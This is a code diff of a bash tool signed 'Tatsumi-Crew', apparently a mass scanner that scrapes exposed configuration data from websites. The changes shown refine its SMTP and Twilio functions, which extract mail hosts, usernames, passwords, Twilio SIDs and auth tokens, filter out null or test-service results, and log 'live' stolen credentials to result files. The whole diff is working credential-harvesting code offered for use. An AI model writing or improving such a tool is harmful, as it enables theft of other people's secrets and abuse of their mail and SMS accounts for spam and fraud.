@@ -100,14 +100,25 @@ AWsCrackeD2(){
 }
 SMTP(){
 	gEtSMTP $1
-	HOST=$(echo $gET | grep -Po '(?<=MAIL_HOST=)[^ ]*' | head -1)
-	MAIL_PORT=$(echo $gET | grep -Po '(?<=MAIL_PORT=)[^ ]*' | head -1)
-	MAIL_USERNAME=$(echo $gET | grep -Po '(?<=MAIL_USERNAME=)[^ ]*' | head -1)
-	MAIL_PASSWORD=$(echo $gET | grep -Po '(?<=MAIL_PASSWORD=)[^ ]*' | head -1)
+	HOST=$(echo "$gET" | grep -Po "(?<=MAIL_HOST=)[^\\n]*" | head -1)
+	MAIL_PORT=$(echo "$gET" | grep -Po '(?<=MAIL_PORT=)[^ ]*' | head -1)
+	MAIL_USERNAME=$(echo "$gET" | grep -Po '(?<=MAIL_USERNAME=)[^ ]*' | head -1)
+	MAIL_PASSWORD=$(echo "$gET" | grep -Po '(?<=MAIL_PASSWORD=)[^ ]*' | head -1)
 	if [[ $gET =~ "MAIL_HOST" ]]; then
-		SMTP="$1 => $HOST|$MAIL_PORT|$MAIL_USERNAME|$MAIL_PASSWORD"
-		printf "${labelijo}-- SMTP LIVE --${normal} ${bold} ${1}\n"
-		echo "$SMTP">>result/smtp.txt
+		if [[ ! -z $MAIL_USERNAME ]] || [[ ! -z $MAIL_PASSWORD ]] || [[ ! -z $HOST ]]; then
+			if [[ $MAIL_USERNAME =~ (null|nul|\*\*\*) ]] || [[ $MAIL_PASSWORD =~ (null|nul|\*\*\*) ]] || [[ $HOST =~ (mailtrap\.io|null|nul|localhost|\*\*\*) ]]; then
+				printf "${labelkuning}-- BAAD --${normal} ${bold} ${1} (have null result or mailtrap smtp)\n"
+				echo "$1">>result/smtp-bad.txt
+			else
+				SMTP="$1 => $HOST|$MAIL_PORT|$MAIL_USERNAME|$MAIL_PASSWORD"
+				SMTP=$(echo "$SMTP" | tr -d "\r" | tr -d "\"")
+				printf "${labelijo}-- SMTP LIVE --${normal} ${bold} $1\n"
+				echo "$SMTP">>result/smtp.txt
+			fi
+		else
+			printf "${labelkuning}-- BAAD --${normal} ${bold} ${1} (have null result or mailtrap smtp)\n"
+			echo "$1">>result/smtp-bad.txt
+		fi
 	else
 		printf "${labelmerah}-- DEAD --${normal} ${bold} ${1}\n"
 		echo "$1">>result/smtp-die.txt
@@ -116,12 +127,12 @@ SMTP(){
 }
 TWILIO(){
 	gEtSMTP $1
-	SID=$(echo $gET | grep -Po '(?<=TWILIO_SID=)[^ ]*' | head -1)
-	TOKEN=$(echo $gET | grep -Po '(?<=TWILIO_AUTH_TOKEN=)[^ ]*' | head -1)
+	SID=$(echo $gET | grep -Po '(?<=TWILIO_SID=")[^"]*' | head -1)
+	TOKEN=$(echo $gET | grep -Po '(?<=TWILIO_AUTH_TOKEN=")[^"]*' | head -1)
 	if [[ $gET =~ "TWILIO" ]]; then
 		SMTP="$SID|$TOKEN"
 		printf "${labelijo}-- TWILIO LIVE --${normal} ${bold} ${1}\n"
-		echo "$SMTP">>result/twilioresult.txt
+		echo "$SMTP">>result/smtp.txt
 	else
 		printf "${labelmerah}-- DEAD --${normal} ${bold} ${1}\n"
 		echo "$1">>result/twilio-die.txt
@@ -158,7 +169,7 @@ cat << "EOF"
     ,|      /     )
    ( |     /     /
     " \_  (__   (__        [Gabut Tools V0.5 By Tatsumi-Crew.NET]
-        "-._,)--._,)       [Thanks For IDLIVE & All Member TatsumixCREW]
+        "-._,)--._,)       [ Thanks For IDLIVE - Monkey B Luffy ]
 EOF
 echo ""
 echo "Method : "
